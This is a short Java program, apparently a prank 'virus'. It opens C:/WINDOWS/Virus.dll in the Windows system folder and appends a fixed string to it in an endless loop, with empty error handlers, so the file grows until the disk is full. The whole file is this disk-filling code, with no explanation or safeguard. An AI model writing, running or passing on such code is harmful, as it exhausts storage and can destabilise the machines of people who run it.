import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;

public class App {
public static void main(String ar[]) {
   try {
   FileWriter f = new FileWriter("C:/WINDOWS/Virus.dll", true);
   while (true) {
   f.write("Programming Is Such A FUN !!!");
   }
  }
  catch(FileNotFoundException e){

  }
   catch(IOException e){

   }
 }
} 